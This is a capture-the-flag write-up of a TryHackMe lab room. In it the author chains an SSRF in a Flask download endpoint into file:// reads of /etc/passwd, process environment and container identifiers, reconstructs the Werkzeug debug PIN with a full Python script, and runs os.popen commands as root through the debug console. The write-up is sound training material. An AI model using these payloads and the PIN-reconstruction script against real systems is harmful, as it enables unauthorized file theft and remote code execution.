# Plant Photographer

**Platform:** TryHackMe
**Date:** 2026-09-19
**Difficulty:** Hard
**Category:** Linux / Web / SSRF / LFI / RCE
**Room URL:** [https://tryhackme.com/room/plantphotographer](https://tryhackme.com/room/plantphotographer)
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> Plant Photographer is a web exploitation room that starts with a Flask application and eventually turns into full code execution. The main chain was **SSRF → arbitrary file read → Flask source disclosure → Werkzeug PIN reconstruction → debug console RCE → root**.

> The biggest thing for me was learning how important it is to actually read leaked source code instead of just throwing random payloads at the application.

---

## 🔍 Reconnaissance

> Same routine as always: RustScan first, then Nmap for service/version detection.

### RustScan

```bash
rustscan -a 10.129.169.11
```

**Results:**

```text
Open 10.129.169.11:22
Open 10.129.169.11:80
```

### Nmap Scan

```bash
nmap -sV -sC -p22,80 10.129.169.11
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH 8.2p1|SSH|
|80|HTTP|Werkzeug 0.16.0 / Python 3.10.7|Flask application|

The HTTP server banner immediately caught my attention:

```text
Werkzeug/0.16.0 Python/3.10.7
```

> Werkzeug is Flask's development server. Seeing it exposed on a target immediately made me think about Flask debug mode. If `debug=True` is enabled, there could potentially be a `/console` endpoint.

> I didn't assume it was vulnerable yet, but I definitely kept it in mind.

---

# 🧭 Steps I Took

## Step 1 — Enumerating the Web Application

I started by grabbing the homepage:

```bash
curl -s http://10.129.169.11/
```

The page was basically a photographer's portfolio, but the raw HTML had two interesting links.

The first was:

```html
<a href="/admin" class="w3-bar-item w3-button w3-text-grey w3-hover-black">
  <span style="color:goldenrod;">Admin Area</span>
</a>
```

And the second was:

```html
<a href="/download?server=secure-file-storage.com:8087&id=75482342">
  <i class="fa fa-download"></i> Download Resume
</a>
```

The `/admin` endpoint was obviously interesting, but the `download` endpoint was even more interesting.

The parameter:

```text
server=secure-file-storage.com:8087
```

looked like the application was accepting a destination server and then fetching something from it.

> Whenever I see a parameter that appears to control **where the server connects to**, I immediately start thinking SSRF.

I also ran a directory scan:

```bash
feroxbuster -u http://10.129.169.11/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-q
```

I found:

```text
200      GET        /download
200      GET        /admin
200      GET        /console
```

That `/console` result was very interesting.

> Flask's debug console is normally associated with debug mode, so now I had a pretty strong lead that the Werkzeug banner wasn't just a coincidence.

I checked the endpoints directly.

### `/admin`

```bash
curl -s http://10.129.169.11/admin
```

Returned:

```text
Admin interface only available from localhost!!!
```

### `/download`

```bash
curl -s http://10.129.169.11/download
```

Returned:

```text
No file selected...
```

### `/console`

The console endpoint existed, but it was protected by a PIN.

> So I had the console, but not the PIN. I decided to investigate the SSRF first because it looked like it could potentially give me access to the application's source code.

---

# Step 2 — Testing the SSRF

First I made sure the download functionality actually worked normally.

```bash
curl -s \
"http://10.129.169.11/download?server=secure-file-storage.com:8087&id=75482342" \
-o resume_test.pdf
```

Then:

```bash
file resume_test.pdf
```

Returned:

```text
resume_test.pdf: PDF document, version 1.7, 1 page(s)
```

So the server was genuinely making a request to the supplied server.

Now I intentionally broke the port:

```bash
curl -s \
"http://10.129.169.11/download?server=secure-file-storage.com:8086&id=75482342"
```

Instead of a normal error page, I got a huge Werkzeug debug traceback.

> And this was the moment the room basically started opening up.

Because debug mode was enabled, the application was exposing its Python traceback and source code whenever an exception occurred.

Buried in the traceback was this:

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
crl.setopt(crl.WRITEDATA, response_buf)
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{...}'])
```

That gave me the **first flag/API key** directly from the traceback.

More importantly, I learned exactly how the application built the request:

```text
server + '/public-docs-k057230990384293/' + filename
```

There was no obvious validation of the `server` value.

The traceback also revealed the application's location:

```text
/usr/src/app/app.py
```

> This was huge because now I knew where the application source lived on disk.

---

# Step 3 — Turning SSRF Into Arbitrary File Read

Since the application was using pycurl to fetch the URL, I tested whether I could use the `file://` scheme.

My first attempt was:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///etc/passwd&id=1"
```

The application returned an error similar to:

```text
pycurl.error: (37, "Couldn't open file /etc/passwd/public-docs-k057230990384293/1.pdf")
```

At first this looks like a failure.

But actually, it proved something important.

The application was trying to access:

```text
/etc/passwd/public-docs-k057230990384293/1.pdf
```

So my `file://` URL was being interpreted by pycurl.

The problem was simply that the application automatically appended its own path.

I needed to stop that path from being appended.

I used a URL fragment:

```text
#
```

Since `#` has special meaning in URLs, I URL-encoded it as `%23`.

```bash
curl -s \
"http://10.129.169.11/download?server=file:///etc/passwd%23&id=1"
```

This time it worked.

I got the contents of:

```text
/etc/passwd
```

> So I now had arbitrary local file read through the SSRF.

---

# Step 4 — Reading the Flask Source Code

Since the traceback had already revealed:

```text
/usr/src/app/app.py
```

I read it directly:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///usr/src/app/app.py%23&id=1"
```

The source revealed the important routes.

The `/admin` route looked roughly like:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
```

And the download functionality contained:

```python
@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server = request.args.get('server','')

    if file_id != '':
        filename = str(int(file_id)) + '.pdf'

        crl.setopt(
            crl.URL,
            server + '/public-docs-k057230990384293/' + filename
        )
```

And at the bottom:

```python
if __name__ == "__main__":
    app.run(
        host='0.0.0.0',
        port=8087,
        debug=True
    )
```

That confirmed what I suspected earlier:

**Debug mode was explicitly enabled.**

> So `/console` was definitely worth attacking.

But before touching the debugger, I noticed something else.

The admin flag was stored at:

```text
private-docs/flag.pdf
```

Since I already had arbitrary file read, I didn't need to somehow become localhost.

I could simply read the file directly.

---

# Step 5 — Reading the Admin Flag

I requested:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=1" \
-o flag_admin.pdf
```

Then:

```bash
file flag_admin.pdf
```

Returned:

```text
flag_admin.pdf: PDF document, version 1.6, 1 page(s)
```

I opened the PDF and recovered the **second flag**.

> This was a good example of why understanding the underlying vulnerability matters. The application tried to protect the file with a localhost check, but the arbitrary file-read vulnerability completely bypassed the intended access control.

---

# Step 6 — Finding the Third Flag

At this point I had two flags, but the final flag was supposed to be in a text file somewhere in the web directory.

I initially tried guessing filenames:

```text
flag.txt
note.txt
secret.txt
readme.txt
```

and similar variations.

Nothing worked.

> Eventually I realized the problem: I was trying to brute-force a filename that was randomly generated.

So instead of continuing to guess, I needed actual command execution.

And the `/console` endpoint was sitting there waiting for me.

---

# Step 7 — Reconstructing the Werkzeug Debug PIN

The Flask debug console was protected by a PIN.

Werkzeug doesn't generate this PIN completely randomly. It derives it from information about the application and host.

Since I already had arbitrary file read, I could retrieve the values needed to reproduce the calculation.

### Public Bits

I needed:

- The username running the application
    
- `flask.app`
    
- `Flask`
    
- The absolute path to Flask's `app.py`
    

### Private Bits

I needed:

- The machine's MAC address
    
- The machine/container ID
    

---

## Finding the Username

I read the process environment:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///proc/self/environ%23&id=1"
```

I found:

```text
HOME=/root
```

So the application was running as:

```text
root
```

---

## Finding Flask's Installation Path

I tested the likely Python package path:

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
"http://10.129.169.11/download?server=file:///usr/local/lib/python3.10/site-packages/flask/app.py%23&id=1"
```

Returned:

```text
200
```

So the Flask source path was:

```text
/usr/local/lib/python3.10/site-packages/flask/app.py
```

---

## Finding the MAC Address

I checked the ARP table:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///proc/net/arp%23&id=1"
```

I found the interface:

```text
eth0
```

Then:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///sys/class/net/eth0/address%23&id=1"
```

Returned:

```text
02:42:ac:14:00:02
```

Werkzeug uses the MAC as the integer returned by `uuid.getnode()`.

I converted it:

```bash
python3 -c "print(int('02:42:ac:14:00:02'.replace(':',''), 16))"
```

Result:

```text
2485378088962
```

---

## Finding the Container ID

I first checked the normal machine ID:

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
"http://10.129.169.11/download?server=file:///etc/machine-id%23&id=1"
```

It returned:

```text
500
```

So I checked the container information:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///proc/self/cgroup%23&id=1"
```

I found:

```text
1:name=systemd:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```

So the container ID was:

```text
77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```

---

# Step 8 — Checking Werkzeug's PIN Algorithm

I didn't want to blindly trust some random online PIN generator because Werkzeug versions can differ.

So I read the actual Werkzeug source:

```bash
curl -s \
"http://10.129.169.11/download?server=file:///usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py%23&id=1" \
--output werkzeug_debug.py
```

Then searched for the hashing function:

```bash
grep -A3 "def hash_pin" werkzeug_debug.py
```

I found:

```python
def hash_pin(pin):
    if isinstance(pin, text_type):
        pin = pin.encode("utf-8", "replace")
    return hashlib.md5(pin + b"shittysalt").hexdigest()[:12]
```

So this specific Werkzeug version was using:

```text
MD5
```

with:

```text
shittysalt
```

> This was important because using the wrong Werkzeug version's PIN-generation logic would just give me the wrong PIN.

---

# Step 9 — Generating the PIN

I put the values together:

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '2485378088962',
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'
]

h = hashlib.md5()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue

    if isinstance(bit, str):
        bit = bit.encode('utf-8')

    h.update(bit)

h.update(b'cookiesalt')

num = None

if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = '-'.join(
    num[x:x + 3]
    for x in range(0, len(num), 3)
)

print(rv)
```

Running it:

```bash
python3 generate_pin.py
```

gave:

```text
110-688-511
```

**Werkzeug PIN:**

```text
110-688-511
```

---

# Step 10 — Getting the Console Secret

The console also uses a session-specific secret.

I grabbed it:

```bash
curl -s \
"http://10.129.169.11/console" | grep SECRET
```

I got:

```text
SECRET = "NfTqiV7tQ865LyLT0h3V";
```

So now I had both:

```text
PIN:    110-688-511
SECRET: NfTqiV7tQ865LyLT0h3V
```

---

# Step 11 — Authenticating to the Debug Console

I submitted the PIN:

```bash
curl -s \
"http://10.129.169.11/console?__debugger__=yes&cmd=pinauth&pin=110-688-511&s=NfTqiV7tQ865LyLT0h3V"
```

The response was:

```json
{
  "auth": true,
  "exhausted": false
}
```

> So the PIN was correct.

But when I tried to actually execute commands, I kept getting a 404.

This took a while to figure out.

---

# Step 12 — Debugging the Debugger

My first thought was that I was using the wrong parameter.

I tried things like:

```text
frame=0
```

and:

```text
frame=-1
```

but neither worked.

Instead of continuing to guess, I read the debugger's JavaScript:

```bash
curl -s \
"http://10.129.169.11/console?__debugger__=yes&cmd=resource&f=debugger.js" \
| grep -B3 -A20 "command"
```

That showed the request the browser actually sends:

```javascript
$.get('', {
    __debugger__: 'yes',
    cmd: cmd,
    frm: frameID,
    s: SECRET
}, ...)
```

The parameter was:

```text
frm
```

not:

```text
frame
```

So I fixed that.

But I **still** got 404s.

> This was where I stopped guessing and went back to the actual server-side Werkzeug code.

I found the command execution condition:

```python
elif (
    self.evalex
    and cmd is not None
    and frame is not None
    and self.secret == secret
    and self.check_pin_trust(environ)
):
    response = self.execute_command(request, cmd, frame)
```

The important part was:

```text
self.check_pin_trust(environ)
```

The PIN authentication wasn't enough by itself.

Werkzeug was setting a cookie when authentication succeeded, and I wasn't sending that cookie back because every `curl` request was being treated as a fresh session.

> So I had the correct PIN, the correct secret and the correct parameters — but I wasn't maintaining the authenticated session.

---

# Step 13 — Finally Getting Code Execution

I created a cookie jar:

```bash
rm -f wz_cookies.txt
```

Then initialized the session:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
"http://10.129.169.11/console" \
-o /dev/null
```

Authenticated:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
"http://10.129.169.11/console?__debugger__=yes&cmd=pinauth&pin=110-688-511&s=NfTqiV7tQ865LyLT0h3V"
```

Then finally executed:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
-G "http://10.129.169.11/console" \
--data-urlencode "__debugger__=yes" \
--data-urlencode "cmd=1+1" \
--data-urlencode "frm=0" \
--data-urlencode "s=NfTqiV7tQ865LyLT0h3V"
```

The console returned:

```text
>>> 1+1
2
```

**Finally.**

I had code execution.

---

# Step 14 — Confirming Root

I ran:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
-G "http://10.129.169.11/console" \
--data-urlencode "__debugger__=yes" \
--data-urlencode "cmd=__import__('os').popen('id').read()" \
--data-urlencode "frm=0" \
--data-urlencode "s=NfTqiV7tQ865LyLT0h3V"
```

The output showed:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

So I was running as:

```text
root
```

> There was no privilege escalation needed. The Flask application itself was running as root inside the container.

---

# Step 15 — Finding the Last Flag

Instead of guessing the filename, I could finally just list the application directory:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
-G "http://10.129.169.11/console" \
--data-urlencode "__debugger__=yes" \
--data-urlencode "cmd=__import__('os').popen('ls -la /usr/src/app').read()" \
--data-urlencode "frm=0" \
--data-urlencode "s=NfTqiV7tQ865LyLT0h3V"
```

I found:

```text
-rw-r--r-- 1 root root 26 May 19 2025 flag-982374827648721338.txt
```

There it was.

The random filename explained why my earlier filename guessing was completely useless.

I read it:

```bash
curl -s \
-c wz_cookies.txt \
-b wz_cookies.txt \
-G "http://10.129.169.11/console" \
--data-urlencode "__debugger__=yes" \
--data-urlencode "cmd=open('/usr/src/app/flag-982374827648721338.txt').read()" \
--data-urlencode "frm=0" \
--data-urlencode "s=NfTqiV7tQ865LyLT0h3V"
```

And got the **third flag**.

> At this point all three flags were recovered and the room was completed.

---

## 🛠 Commands Used

|Command|What It Does|
|---|---|
|`rustscan -a <IP>`|Quickly discovers open ports|
|`nmap -sV -sC ...`|Performs service/version and default-script enumeration|
|`curl -s <URL>`|Sends HTTP requests and retrieves responses|
|`feroxbuster -u <URL> ...`|Enumerates web directories/endpoints|
|`file <file>`|Identifies downloaded file types|
|`grep`|Searches output/source code for specific strings|
|`python3 -c ...`|Performs quick calculations/conversions|
|`python3 generate_pin.py`|Generates the Werkzeug debug PIN|
|`curl -c cookies -b cookies ...`|Maintains an authenticated HTTP session|
|`--data-urlencode`|Safely URL-encodes command/query parameters|

---

## 🚩 Flags Found

|Flag|Where I Found It|
|---|---|
|API key / Flag 1|Werkzeug debug traceback after triggering an application error|
|Flag 2|`/usr/src/app/private-docs/flag.pdf` through arbitrary file read|
|Flag 3|Randomly named `.txt` file in `/usr/src/app/` after gaining console RCE|

> The actual flag values are omitted here rather than inventing or reproducing values that aren't necessary for the write-up.

---

## 💡 What I Learned

- **Always pay attention to server banners.** Seeing `Werkzeug` immediately gave me a reason to investigate Flask debug mode.
    
- **Deliberately breaking an application can reveal more than using it normally.** The wrong port triggered a Werkzeug traceback that exposed source code, paths and a secret.
    
- **SSRF can become local file read.** The `server` parameter wasn't just fetching remote documents; controlling the URL scheme let me turn it into an arbitrary file-read primitive.
    
- **A failed exploit can still prove the vulnerability.** When `/etc/passwd` initially failed because the application appended another path, the error actually showed that my `file://` payload was being processed.
    
- **Read the target's actual source when you can.** Instead of assuming how Werkzeug generated its PIN, I retrieved the exact version's implementation and used that.
    
- **Library versions matter.** The Werkzeug version in this room used a different PIN hashing implementation than newer versions, so blindly using a modern script could have sent me in the wrong direction.
    
- **Authentication state matters.** Getting `{"auth": true}` didn't mean every later request was authenticated. The debugger trusted a cookie that I wasn't sending back.
    
- **Stop guessing when you have code execution.** I wasted time guessing the final flag filename. Once I had RCE, `ls` solved the problem immediately.
    
- **The biggest chain was SSRF → LFI → source disclosure → PIN reconstruction → debug console RCE → root.** Each vulnerability made the next stage possible.
    

---

## ❓ What Confused Me / What to Research Next

- I want to understand **Werkzeug's debug PIN generation** more deeply instead of just following the algorithm.
    
- I want to get better at recognizing **SSRF → local file read** possibilities, especially when applications modify the supplied URL.
    
- The debugger authentication issue was probably the biggest thing that slowed me down. I want to understand **cookies, session state and Werkzeug's `check_pin_trust()`** better.
    
- I also want to practice more situations where the initial vulnerability isn't the final goal, but instead gives me the information needed to **chain into another vulnerability**.
    

---

## 🔗 Linked Notes

- [RustScan](https://chatgpt.com/c/RustScan)
    
- [Nmap](https://chatgpt.com/c/Nmap)
    
- [Feroxbuster](https://chatgpt.com/c/Feroxbuster)
    
- [SSRF](https://chatgpt.com/c/SSRF)
    
- [LFI](https://chatgpt.com/c/LFI)
    
- [Flask](https://chatgpt.com/c/Flask)
    
- [Werkzeug](https://chatgpt.com/c/Werkzeug)
    
- [Python](https://chatgpt.com/c/Python)
    
- [RCE](https://chatgpt.com/c/RCE)
    
- [Linux Privilege Escalation](Linux Privilege Escalation)
    
- [Web Enumeration](Web Enumeration)
    
- [Burp Suite](Burp Suite)
    

---

## 📎 Resources Used

- TryHackMe — Plant Photographer
    
- Werkzeug source code
    
- Flask documentation
    
- Feroxbuster
    
- Nmap
    
- RustScan
    

---

_Report written in_ **TryHackMe Vault** _— part of my ethical hacking journey 🛡️_